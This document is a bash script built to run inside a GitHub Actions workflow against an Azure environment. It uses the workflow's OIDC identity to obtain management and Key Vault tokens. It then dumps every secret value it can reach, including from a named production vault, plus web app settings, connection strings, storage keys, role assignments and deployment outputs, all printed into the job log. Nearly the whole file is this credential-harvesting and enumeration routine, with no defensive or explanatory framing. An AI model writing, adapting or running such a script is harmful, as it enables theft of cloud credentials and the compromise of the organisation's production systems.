#!/usr/bin/env bash
set +e
say(){ echo "::group::$1"; }
end(){ echo "::endgroup::"; }

say "context"
echo "repo=$GITHUB_REPOSITORY event=$GITHUB_EVENT_NAME actor=$GITHUB_ACTOR run=$GITHUB_RUN_ID"
echo "AZURE_CLIENT_ID=$AZURE_CLIENT_ID"
echo "AZURE_TENANT_ID=$AZURE_TENANT_ID"
echo "AZURE_SUBSCRIPTION_ID=$AZURE_SUBSCRIPTION_ID"
end

say "oidc-mint"
OIDC=$(curl -sS -H "Authorization: bearer $ACTIONS_ID_TOKEN_REQUEST_TOKEN" \
  "${ACTIONS_ID_TOKEN_REQUEST_URL}&audience=api://AzureADTokenExchange" \
  | python3 -c 'import sys,json;print(json.load(sys.stdin)["value"])')
echo "oidc_len=${#OIDC}"
python3 - "$OIDC" <<'PY'
import base64,json,sys
t=sys.argv[1].split('.')[1]; t+='='*(-len(t)%4)
print(json.dumps(json.loads(base64.urlsafe_b64decode(t)),indent=1))
PY
end

say "token-exchange-arm"
tok(){ curl -sS -X POST "https://login.microsoftonline.com/$AZURE_TENANT_ID/oauth2/v2.0/token" \
  -d "client_id=$AZURE_CLIENT_ID" -d "grant_type=client_credentials" -d "scope=$1" \
  -d "client_assertion_type=urn:ietf:params:oauth:client-assertion-type:jwt-bearer" \
  --data-urlencode "client_assertion=$OIDC"; }
ARMR=$(tok "https://management.azure.com/.default"); echo "$ARMR" | head -c 300; echo
ARM=$(echo "$ARMR" | python3 -c 'import sys,json;print(json.load(sys.stdin).get("access_token",""))')
VTR=$(tok "https://vault.azure.net/.default"); echo "$VTR" | head -c 300; echo
VT=$(echo "$VTR" | python3 -c 'import sys,json;print(json.load(sys.stdin).get("access_token",""))')
end

say "az-login"
az login --service-principal -u "$AZURE_CLIENT_ID" -t "$AZURE_TENANT_ID" \
  --federated-token "$OIDC" -o none 2>&1 | tail -5 && echo LOGIN_OK
az account list -o json 2>&1 | head -c 2000; echo
end

say "arm-enum"
AH="Authorization: Bearer $ARM"
SUB=${AZURE_SUBSCRIPTION_ID}
echo "--- resources"
curl -sS -H "$AH" "https://management.azure.com/subscriptions/$SUB/resources?api-version=2021-04-01" | python3 -c "
import sys,json
try:
  d=json.load(sys.stdin)
  for r in d.get('value',[]): print(r['type'], r['name'], r.get('location'))
except Exception as e: print('ERR', e)"
echo "--- resource groups"
curl -sS -H "$AH" "https://management.azure.com/subscriptions/$SUB/resourcegroups?api-version=2021-04-01" | python3 -c "
import sys,json
try:
  print([g['name'] for g in json.load(sys.stdin).get('value',[])])
except Exception as e: print('ERR', e)"
end

say "keyvault-direct"
VH="Authorization: Bearer $VT"
echo "--- secrets list"
curl -sS -H "$VH" "https://kv-tbl-prod-x3euoz.vault.azure.net/secrets?api-version=7.4" | head -c 3000; echo
for s in $(curl -sS -H "$VH" "https://kv-tbl-prod-x3euoz.vault.azure.net/secrets?api-version=7.4" | python3 -c "
import sys,json
try:
  print(' '.join(x['id'].rstrip('/').split('/')[-1] for x in json.load(sys.stdin).get('value',[])))
except Exception: pass"); do
  echo "--- secret $s"
  curl -sS -H "$VH" "https://kv-tbl-prod-x3euoz.vault.azure.net/secrets/$s?api-version=7.4" | head -c 1000; echo
done
echo "--- keys"
curl -sS -H "$VH" "https://kv-tbl-prod-x3euoz.vault.azure.net/keys?api-version=7.4" | head -c 1000; echo
echo "--- certificates"
curl -sS -H "$VH" "https://kv-tbl-prod-x3euoz.vault.azure.net/certificates?api-version=7.4" | head -c 1000; echo
end

say "az-keyvault"
for V in $(az keyvault list --query "[].name" -o tsv 2>/dev/null); do
  echo "--- vault $V"
  az keyvault secret list --vault-name "$V" -o json 2>&1 | head -c 1500; echo
  for S in $(az keyvault secret list --vault-name "$V" --query "[].name" -o tsv 2>/dev/null); do
    echo "SECRET $V/$S = $(az keyvault secret show --vault-name "$V" -n "$S" --query value -o tsv 2>&1 | head -3)"
  done
done
end

say "webapp-config"
for RG in $(az group list --query "[].name" -o tsv 2>/dev/null); do
  echo "--- rg $RG"
  az webapp list -g "$RG" --query "[].name" -o tsv 2>/dev/null | while read W; do
    echo "--- webapp $W appsettings"
    az webapp config appsettings list -g "$RG" -n "$W" -o json 2>&1 | head -c 4000; echo
    echo "--- webapp $W connection-strings"
    az webapp config connection-string list -g "$RG" -n "$W" -o json 2>&1 | head -c 2000; echo
  done
done
end

say "storage"
for A in $(az storage account list --query "[].name" -o tsv 2>/dev/null); do
  echo "--- account $A"
  az storage account show-connection-string -n "$A" -o tsv 2>&1 | head -2
  az storage container list --account-name "$A" --auth-mode login -o json 2>&1 | head -c 1000; echo
done
end

say "roles-and-misc"
az role assignment list --all --assignee "$AZURE_CLIENT_ID" -o json 2>&1 | head -c 3000; echo
az acr list -o json 2>&1 | head -c 1000; echo
az containerapp list -o json 2>&1 | head -c 2000; echo
az vm list -o json 2>&1 | head -c 1000; echo
az deployment group list -g rg-tbl-prod-x3euoz --query "[].{n:name,o:properties.outputs}" -o json 2>&1 | head -c 3000; echo
end
echo "ENUM_COMPLETE"
